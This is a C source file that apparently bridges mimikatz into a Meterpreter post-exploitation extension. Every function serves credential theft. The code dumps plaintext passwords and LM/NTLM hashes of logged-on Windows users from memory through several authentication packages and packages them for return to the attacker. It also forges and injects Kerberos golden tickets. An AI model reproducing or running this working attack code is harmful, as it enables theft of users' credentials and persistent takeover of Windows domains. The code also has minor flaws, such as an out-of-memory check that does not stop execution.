#include "main.h"
#include "mimikatz_interface.h"
#include <NTSecAPI.h>

typedef void (CALLBACK * PKUHL_M_SEKURLSA_EXTERNAL) (IN CONST PLUID luid, IN CONST PUNICODE_STRING username, IN CONST PUNICODE_STRING domain, IN CONST PUNICODE_STRING password, IN CONST PBYTE lm, IN CONST PBYTE ntlm, IN OUT LPVOID pvData);
typedef LONG (* PKUHL_M_SEKURLSA_ENUMERATOR)(PKUHL_M_SEKURLSA_EXTERNAL callback, LPVOID state);

extern LONG kuhl_m_sekurlsa_all_enum(PKUHL_M_SEKURLSA_EXTERNAL callback, LPVOID state);
extern LONG kuhl_m_sekurlsa_wdigest_enum(PKUHL_M_SEKURLSA_EXTERNAL callback, LPVOID state);
extern LONG kuhl_m_sekurlsa_msv_enum(PKUHL_M_SEKURLSA_EXTERNAL callback, LPVOID state);
extern LONG kuhl_m_sekurlsa_kerberos_enum(PKUHL_M_SEKURLSA_EXTERNAL callback, LPVOID state);
extern LONG kuhl_m_sekurlsa_tspkg_enum(PKUHL_M_SEKURLSA_EXTERNAL callback, LPVOID state);
extern LONG kuhl_m_sekurlsa_livessp_enum(PKUHL_M_SEKURLSA_EXTERNAL callback, LPVOID state);
extern LONG kuhl_m_sekurlsa_ssp_enum(PKUHL_M_SEKURLSA_EXTERNAL callback, LPVOID state);

// TODO:
//extern LONG kuhl_m_sekurlsa_tickets_enum(PKUHL_M_SEKURLSA_EXTERNAL callback, LPVOID state);
//extern LONG kuhl_m_sekurlsa_dpapi_enum(PKUHL_M_SEKURLSA_EXTERNAL callback, LPVOID state);

extern LONG kuhl_m_kerberos_use_ticket(PBYTE fileData, DWORD fileSize);
extern LONG kuhl_m_kerberos_create_golden_ticket(PCWCHAR szUser, PCWCHAR szDomain, PCWCHAR szSid, PCWCHAR szNtlm, PBYTE* ticketBuffer, DWORD* ticketBufferSize);

const wchar_t* EmptyString = L"";

void CALLBACK handle_result(IN CONST PLUID luid, IN CONST PUNICODE_STRING username, IN CONST PUNICODE_STRING domain,
	IN CONST PUNICODE_STRING password, IN CONST PBYTE lm, IN CONST PBYTE ntlm, IN OUT LPVOID pvData)
{
	UINT hi = 0;
	UINT lo = 0;
	char ntlmHash[33];
	char lmHash[33];

	DWORD i;
	Tlv entries[7];
	Packet* packet = (Packet*)pvData;

	ZeroMemory(&entries[0], sizeof(entries));

	if (username != NULL && username->Buffer != NULL && username->Length > 0)
	{
		dprintf("[KIWI] Adding username %u chars", username->Length);
		packet_add_tlv_wstring_entry(&entries[0], TLV_TYPE_KIWI_PWD_USERNAME, username->Buffer, username->Length);
	}
	else
	{
		dprintf("[KIWI] Adding blank username");
		packet_add_tlv_wstring_entry(&entries[0], TLV_TYPE_KIWI_PWD_USERNAME, EmptyString, 0);
	}

	if (domain != NULL && domain->Buffer != NULL && domain->Length > 0)
	{
		dprintf("[KIWI] Adding domain %u chars", domain->Length);
		packet_add_tlv_wstring_entry(&entries[1], TLV_TYPE_KIWI_PWD_DOMAIN, domain->Buffer, domain->Length);
	}
	else
	{
		dprintf("[KIWI] Adding blank domain");
		packet_add_tlv_wstring_entry(&entries[1], TLV_TYPE_KIWI_PWD_DOMAIN, EmptyString, 0);
	}

	if (password != NULL && password->Buffer != NULL && password->Length > 0)
	{
		dprintf("[KIWI] Adding password %u chars", password->Length);
		packet_add_tlv_wstring_entry(&entries[2], TLV_TYPE_KIWI_PWD_PASSWORD, password->Buffer, password->Length);
	}
	else
	{
		dprintf("[KIWI] Adding blank password");
		packet_add_tlv_wstring_entry(&entries[2], TLV_TYPE_KIWI_PWD_PASSWORD, EmptyString, 0);
	}

	dprintf("[KIWI] Adding auth info");
	entries[3].header.length = sizeof(UINT);
	entries[3].header.type = TLV_TYPE_KIWI_PWD_AUTH_HI;
	entries[3].buffer = (PUCHAR)&hi;
	entries[4].header.length = sizeof(UINT);
	entries[4].header.type = TLV_TYPE_KIWI_PWD_AUTH_LO;
	entries[4].buffer = (PUCHAR)&lo;

	if (luid != NULL)
	{
		hi = htonl((UINT)luid->HighPart);
		lo = htonl((UINT)luid->LowPart);
	}

	// 16 bytes long
	if (lm != NULL)
	{
		sprintf_s(lmHash, sizeof(lmHash), "%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X",
			lm[0], lm[1], lm[2], lm[3], lm[4], lm[5], lm[6], lm[7], lm[8],
			lm[9], lm[10], lm[11], lm[12], lm[13], lm[14], lm[15]);
		dprintf("[KIWI] Adding lm hash: %s", lmHash);
		entries[5].header.length = sizeof(lmHash);
		entries[5].header.type = TLV_TYPE_KIWI_PWD_LMHASH;
		entries[5].buffer = (PUCHAR)lmHash;
	}
	else
	{
		dprintf("[KIWI] Adding blank lm");
		packet_add_tlv_wstring_entry(&entries[5], TLV_TYPE_KIWI_PWD_LMHASH, EmptyString, 0);
	}

	// 16 bytes long
	if (ntlm != NULL)
	{
		sprintf_s(ntlmHash, sizeof(ntlmHash), "%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X",
			ntlm[0], ntlm[1], ntlm[2], ntlm[3], ntlm[4], ntlm[5], ntlm[6], ntlm[7], ntlm[8],
			ntlm[9], ntlm[10], ntlm[11], ntlm[12], ntlm[13], ntlm[14], ntlm[15]);
		dprintf("[KIWI] Adding ntlm hash: %s", ntlmHash);
		entries[6].header.length = sizeof(ntlmHash);
		entries[6].header.type = TLV_TYPE_KIWI_PWD_NTLMHASH;
		entries[6].buffer = (PUCHAR)ntlmHash;
	}
	else
	{
		dprintf("[KIWI] Adding blank ntlm");
		packet_add_tlv_wstring_entry(&entries[6], TLV_TYPE_KIWI_PWD_NTLMHASH, EmptyString, 0);
	}

	dprintf("[KIWI] Adding to packet");
	packet_add_tlv_group(packet, TLV_TYPE_KIWI_PWD_RESULT, entries, 7);

	dprintf("[KIWI] Freeing buffers");
	for (i = 0; i < 3; ++i)
	{
		if (entries[i].buffer != NULL)
		{
			free(entries[i].buffer);
		}
	}
}

DWORD mimikatz_scrape_passwords(DWORD cmdId, Packet* packet)
{
	switch (cmdId)
	{
		case KIWI_PWD_ID_SEK_ALLPASS:
		{
			dprintf("[KIWI] running all pass");
			return kuhl_m_sekurlsa_all_enum(handle_result, packet);
		}
		case KIWI_PWD_ID_SEK_WDIGEST:
		{
			dprintf("[KIWI] running wdigest");
			return kuhl_m_sekurlsa_wdigest_enum(handle_result, packet);
		}
		case KIWI_PWD_ID_SEK_MSV:
		{
			dprintf("[KIWI] running msv");
			return kuhl_m_sekurlsa_msv_enum(handle_result, packet);
		}
		case KIWI_PWD_ID_SEK_KERBEROS:
		{
			dprintf("[KIWI] running kerberos");
			return kuhl_m_sekurlsa_kerberos_enum(handle_result, packet);
		}
		case KIWI_PWD_ID_SEK_TSPKG:
		{
			dprintf("[KIWI] running tspkg");
			return kuhl_m_sekurlsa_tspkg_enum(handle_result, packet);
		}
		case KIWI_PWD_ID_SEK_LIVESSP:
		{
			dprintf("[KIWI] running livessp");
			return kuhl_m_sekurlsa_livessp_enum(handle_result, packet);
		}
		case KIWI_PWD_ID_SEK_SSP:
		{
			dprintf("[KIWI] running ssp");
			return kuhl_m_sekurlsa_ssp_enum(handle_result, packet);
		}
		case KIWI_PWD_ID_SEK_TICKETS:
		{
			dprintf("[KIWI] running tickets");
			break;
		}
		case KIWI_PWD_ID_SEK_DPAPI:
		{
			dprintf("[KIWI] running dpapi");
			break;
		}
	}

	return ERROR_INVALID_PARAMETER;
}

wchar_t* ascii_to_wide_string(char* ascii)
{
	size_t requiredChars = strlen(ascii) + 1;
	wchar_t* buffer = (wchar_t*)calloc(requiredChars, sizeof(wchar_t));

	if (buffer != NULL)
	{
		swprintf_s(buffer, requiredChars, L"%S", ascii);
	}
	return buffer;
}

DWORD mimikatz_golden_ticket_create(char* user, char* domain, char* sid, char* tgt, Packet* response)
{
	DWORD result = 0;
	BYTE* ticketBuffer;
	DWORD ticketBufferSize;
	wchar_t* wUser = ascii_to_wide_string(user);
	wchar_t* wDomain = ascii_to_wide_string(domain);
	wchar_t* wSid = ascii_to_wide_string(sid);
	wchar_t* wTgt = ascii_to_wide_string(tgt);

	do
	{
		if (!wUser || !wDomain || !wSid || !wTgt)
		{
			dprintf("[MIMIKTAZ] Out of memory");
			result = ERROR_NOT_ENOUGH_MEMORY;
		}

		result = kuhl_m_kerberos_create_golden_ticket(wUser, wDomain, wSid, wTgt, &ticketBuffer, &ticketBufferSize);
		if (result != ERROR_SUCCESS)
		{
			break;
		}

		packet_add_tlv_raw(response, TLV_TYPE_KIWI_GOLD_TICKET, ticketBuffer, ticketBufferSize);
	} while (0);

	if (wUser)
	{
		free(wUser);
	}
	if (wDomain)
	{
		free(wDomain);
	}
	if (wSid)
	{
		free(wSid);
	}
	if (wTgt)
	{
		free(wTgt);
	}

	return result;
}

DWORD mimikatz_golden_ticket_use(BYTE* buffer, DWORD bufferSize)
{
	return kuhl_m_kerberos_use_ticket(buffer, bufferSize);
}